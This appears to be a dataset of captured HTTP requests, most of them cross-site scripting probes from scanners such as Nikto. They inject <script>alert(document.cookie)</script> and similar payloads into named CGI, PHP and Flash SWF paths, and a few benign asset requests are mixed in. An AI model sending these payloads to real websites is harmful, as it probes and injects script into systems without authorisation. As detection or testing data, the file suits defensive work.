"/test.php?%3CSCRIPT%3Ealert('Vulnerable')%3C%2FSCRIPT%3E=x HTTP/1.1
Connection: Keep-Alive
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000737)

"
"/~/<script>alert('Vulnerable')</script>.asp HTTP/1.1
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000769)
Connection: Keep-Alive

"
"/usercp.php?function=avataroptions:javascript:alert(%27Vulnerable%27) HTTP/1.1
Connection: Keep-Alive
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000775)

"
"/robots.txt?query=%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 0

"
"/webcalendar/colors.php?color=</script><script>alert(document.cookie)</script> HTTP/1.1
User-Agent: Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003117)
Connection: Keep-Alive

"
"/debug/errorInfo?title===<script>alert('Vulnerable');</script> HTTP/1.1
Connection: Keep-Alive
User-Agent: Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003124)

"
"/seArch_For_ONe_flag.php?userid=1&password=&%22%3e%3cscript%3econfirm(299792458)%3c%2fscript%3e%3c%22=1 HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Upgrade-Insecure-Requests: 1

"
"/seArch_For_ONe_flag.php?userid=1&password=&%5c%22%3balert(299792458)%3b%2f%2f=1 HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Upgrade-Insecure-Requests: 1

"
"/search.php?sess=your_session_id&lookfor=&lt;script&gt;alert(document.cookie)&lt;/script&gt; HTTP/1.1
User-Agent: Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003150)
Connection: Keep-Alive

"
"/options.php?optpage=<script>alert('Vulnerable!')</script> HTTP/1.1
User-Agent: Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003171)
Connection: Keep-Alive

"
"/acart2_0/admin/error.asp?msg=<script>alert(\""test\"")</script> HTTP/1.1
Connection: Keep-Alive
User-Agent: Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003187)

"
"/sysuser/docmgr/sendmail.stm?path=<script>alert(document.cookie)</script> HTTP/1.1
Connection: Keep-Alive
User-Agent: Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003237)

"
"/sysuser/docmgr/vchist.stm?path=<script>alert(document.cookie)</script> HTTP/1.1
User-Agent: Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003242)
Connection: Keep-Alive

"
"/sysuser/docmgr/sendmail.stm?name=<script>alert(document.cookie)</script> HTTP/1.1
User-Agent: Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003247)
Connection: Keep-Alive

"
"/cgi-915/testcgi.exe?<script>alert(document.cookie)</script> HTTP/1.1
User-Agent: Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003252)
Connection: Keep-Alive

"
"/bin/testcgi.exe?<script>alert(document.cookie)</script> HTTP/1.1
User-Agent: Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003252)
Connection: Keep-Alive

"
"/cgi/testcgi.exe?<script>alert(document.cookie)</script> HTTP/1.1
User-Agent: Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003252)
Connection: Keep-Alive

"
"/cgi-bin/testcgi.exe?<script>alert(document.cookie)</script> HTTP/1.1
User-Agent: Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003252)
Connection: Keep-Alive

"
"/ows-bin/testcgi.exe?<script>alert(document.cookie)</script> HTTP/1.1
Connection: Keep-Alive
User-Agent: Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003252)

"
"/cgi-sys/testcgi.exe?<script>alert(document.cookie)</script> HTTP/1.1
User-Agent: Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003252)
Connection: Keep-Alive

"
"/cgi.cgi/environ.pl?param1=<script>alert(document.cookie)</script> HTTP/1.1
User-Agent: Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003253)
Connection: Keep-Alive

"
"/cgi-915/environ.pl?param1=<script>alert(document.cookie)</script> HTTP/1.1
Connection: Keep-Alive
User-Agent: Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003253)

"
"/ows-bin/environ.pl?param1=<script>alert(document.cookie)</script> HTTP/1.1
User-Agent: Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003253)
Connection: Keep-Alive

"
"/cgi-sys/environ.pl?param1=<script>alert(document.cookie)</script> HTTP/1.1
User-Agent: Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003253)
Connection: Keep-Alive

"
"/scripts/environ.pl?param1=<script>alert(document.cookie)</script> HTTP/1.1
User-Agent: Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003253)
Connection: Keep-Alive

"
"/syshelp/stmex.stm?foo=<script>alert(document.cookie)</script> HTTP/1.1
User-Agent: Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003255)
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 8

&bar=456"
"/netutils/ipdata.stm?ipaddr=<script>alert(document.cookie)</script> HTTP/1.1
Connection: Keep-Alive
User-Agent: Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003259)

"
"/test/unit/helpers.js HTTP/1.1
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept-Language: zh-CN,en,*
Pragma: no-cache
Cache-Control: no-cache

"
"/vendor/qunit.js HTTP/1.1
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept-Language: zh-CN,en,*
Pragma: no-cache
Cache-Control: no-cache

"
"/test/unit/helpers.js HTTP/1.1
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept-Language: zh-CN,en,*
Pragma: no-cache
Cache-Control: no-cache

"
"/test/unit/pjax_fallback.js HTTP/1.1
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept-Language: zh-CN,en,*
Pragma: no-cache
Cache-Control: no-cache

"
"/?wvstest=javascript:domxssExecutionSink(1,%22'%5C%22%3E%3Cxsstag%3E()locxss%22) HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept-Language: zh-CN,en,*
Pragma: no-cache
Cache-Control: no-cache

"
"/assets/cf9f2322/yii.activeForm.js HTTP/1.1
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept-Language: zh-CN,en,*
Pragma: no-cache
Cache-Control: no-cache

"
"/assets/d74dde54/jquery.js HTTP/1.1
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept-Language: zh-CN,en,*
Pragma: no-cache
Cache-Control: no-cache

"
"/assets/1d5ca155/css/bootstrap.css HTTP/1.1
Accept: text/css,*/*;q=0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept-Language: zh-CN,en,*
Pragma: no-cache
Cache-Control: no-cache

"
"/css/site.css HTTP/1.1
Accept: text/css,*/*;q=0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept-Language: zh-CN,en,*
Pragma: no-cache
Cache-Control: no-cache

"
"/assets/cf9f2322/yii.validation.js HTTP/1.1
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept-Language: zh-CN,en,*
Pragma: no-cache
Cache-Control: no-cache

"
"/assets/1d5ca155/js/bootstrap.js HTTP/1.1
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept-Language: zh-CN,en,*
Pragma: no-cache
Cache-Control: no-cache

"
"/assets/cf9f2322/yii.captcha.js HTTP/1.1
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept-Language: zh-CN,en,*
Pragma: no-cache
Cache-Control: no-cache

"
"/assets/cf9f2322/yii.js HTTP/1.1
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept-Language: zh-CN,en,*
Pragma: no-cache
Cache-Control: no-cache

"
"/assets/cf9f2322/yii.validation.js HTTP/1.1
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept-Language: zh-CN,en,*
Pragma: no-cache
Cache-Control: no-cache

"
"/assets/cf9f2322/yii.activeForm.js HTTP/1.1
Accept: */*
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept-Language: zh-CN,en,*
Pragma: no-cache
Cache-Control: no-cache

"
"/?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/index.php?r=users/index'%22()%26%25<acx><ScRiPt%20>5p74(9284)</ScRiPt> HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"HEAD /ldap/cgi-bin/ldacgi.exe?Action=<script>alert(\""Vulnerable\"")</script> HTTP/1.1
Accept: */*
User-Agent: Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000867)

"
"/sysuser/docmgr/info.stm?path=<script>alert(document.cookie)</script> HTTP/1.1
Connection: Keep-Alive
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003233)

"
"/sysuser/docmgr/search.stm?path=<script>alert(document.cookie)</script> HTTP/1.1
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003236)
Connection: Keep-Alive

"
"/sysuser/docmgr/sendmail.stm?name=<script>alert(document.cookie)</script> HTTP/1.1
Connection: Keep-Alive
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003247)

"
"/sysuser/docmgr/vccheckin.stm?name=<script>alert(document.cookie)</script> HTTP/1.1
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003249)
Connection: Keep-Alive

"
"/syshelp/cscript/showfncs.stm?pkg=<script>alert(document.cookie)</script> HTTP/1.1
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003257)
Connection: Keep-Alive

"
"/sysuser/docmgr/search.stm?query=<script>alert(document.cookie)</script> HTTP/1.1
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003262)
Connection: Keep-Alive

"
"/fK9SXTLEjduseftJULrGWnZqCiU7prLeGkbJZGtHFfYWDoA8nzd67JyW7UeyR3jwiCcigOVt2wKSWYi2atx9DpwFFtVMRMiLxeh3gbVy25NT9NA6JYmwHYIu35MzQ1RkN7ajVpJs8pw7QmMHjPy8uKm7RtEc1iC8zWuoAUvDYP1lXOhS1o4vOSmQPdb6W7RBC2LPsOEr34bOnkiUsFUgLFGdWdztfvX<font%20size=50><script>alert(11)</script><!--//-- HTTP/1.1
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003323)
Connection: Keep-Alive

"
"/pls/dadname/htp.print?cbuf=<script>alert('Vulnerable')</script> HTTP/1.1
Connection: Keep-Alive
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003355)

"
"/rpc.php?q=\""><script>alert(document.cookie)</script> HTTP/1.1
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003497)
Connection: Keep-Alive

"
"/jsp-examples/jsp2/jspx/textRotate.jspx?name=<script>alert(111)</script> HTTP/1.1
Connection: Keep-Alive
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003595)

"
"/wwwping/index.stm?wwwsite=<script>alert(document.cookie)</script> HTTP/1.1
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003226)
Connection: Keep-Alive

"
"/sysuser/docmgr/vccreate.stm?path=<script>alert(document.cookie)</script> HTTP/1.1
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003241)
Connection: Keep-Alive

"
"/netutils/ipdata.stm?ipaddr=<script>alert(document.cookie)</script> HTTP/1.1
Connection: Keep-Alive
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003259)

"
"/netutils/findata.stm?host=<script>alert(document.cookie)</script> HTTP/1.1
Connection: Keep-Alive
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003260)

"
"/jsp-examples/jsp2/el/implicit-objects.jsp?foo=<script>alert(112)</script> HTTP/1.1
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003596)
Connection: Keep-Alive

"
"/theme1/selector?button=status,monitor,session\""><script>alert('Vulnerable')</script>&button_url=/system/status/status,/system/status/moniter,/system/status/session HTTP/1.1
Connection: Keep-Alive
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003037)

"
"/webcalendar/week.php?user=\""><script>alert(document.cookie)</script> HTTP/1.1
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003118)
Connection: Keep-Alive

"
"/debug/dbg?host==<script>alert('Vulnerable');</script> HTTP/1.1
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003122)
Connection: Keep-Alive

"
"/options.php?optpage=<script>alert('Vulnerable!')</script> HTTP/1.1
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003171)
Connection: Keep-Alive

"
"/acart2_0/deliver.asp?msg=<script>alert(\""test\"")</script> HTTP/1.1
Connection: Keep-Alive
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003185)

"
"/antispam/listdel?file=blacklist&name=b<script>alert('Vulnerable')</script>&startline=0 HTTP/1.1
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003032)
Connection: Keep-Alive

"
"/theme1/selector?button=status,monitor,session&button_url=/system/status/status,/system/status/moniter\""><script>alert('Vulnerable')</script>,/system/status/session HTTP/1.1
Connection: Keep-Alive
User-Agent: Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003035)

"
"HEAD /red-arrow/ HTTP/1.1
User-Agent: DirBuster-0.12 (http://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)

"
"/zp-core/admin-uploadify/uploadify.swf?uploadifyID=00%22%29%29;}catch%28e%29{alert%281%29;}//%28%22&movieName=%22])}catch(e){if(!window.x){window.x=1;alert(2)}}//&.swf HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/clientscript/yui/uploader/assets/uploader.swf?allowedDomain=""})))}catch(e){alert(document.domain);}// HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/core/clientscript/yui/uploader/assets/uploader.swf?allowedDomain=""})))}catch(e){alert(document.domain);}// HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/yui/uploader/assets/uploader.swf?allowedDomain=""})))}catch(e){alert(document.domain);}// HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/js/yui/uploader/assets/uploader.swf?allowedDomain=""})))}catch(e){alert(document.domain);}// HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/assets/js/zeroclipboard/ZeroClipboard.swf?id=%22))}catch(e){}if(!self.a)self.a=!prompt(document.domain)//&width&height HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/wp-content/plugins/slidedeck2/js/zeroclipboard/ZeroClipboard.swf?id=%22))}catch(e){}if(!self.a)self.a=!prompt(document.domain)//&width&height HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/jwplayer/player.swf?playerready=alert(document.domain)&debug=function(){alert(document.domain)} HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/media/jwplayer/player.swf?playerready=alert(document.domain)&debug=function(){alert(document.domain)} HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/open-flash-chart/open-flash-chart.swf?get-data=(function(){alert(document.domain)})() HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/js/plupload//plupload.flash.swf?id=""));}catch(e){alert(1);}// HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/uploadify/uploadify.swf?uploadifyID=00%22%29%29;}catch%28e%29{alert%281%29;}//%28%22&movieName=%22])}catch(e){if(!window.x){window.x=1;alert(2)}}//&.swf HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/joomla/components/com_jnews/includes/openflashchart/open-flash-chart.swf?get-data=(function(){alert(document.domain)})() HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/piwik/libs/open-flash-chart/php-ofc-library/open-flash-chart.swf?get-data=(function(){alert(document.domain)})() HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

"
"/thirdparty/jquery/uploadify/uploadify.swf?uploadifyID=00%22%29%29;}catch%28e%29{alert%281%29;}//%28%22&movieName=%22])}catch(e){if(!window.x){window.x=1;alert(2)}}//&.swf HTTP/1.1
Connection: Keep-alive
Accept-Encoding: gzip,deflate
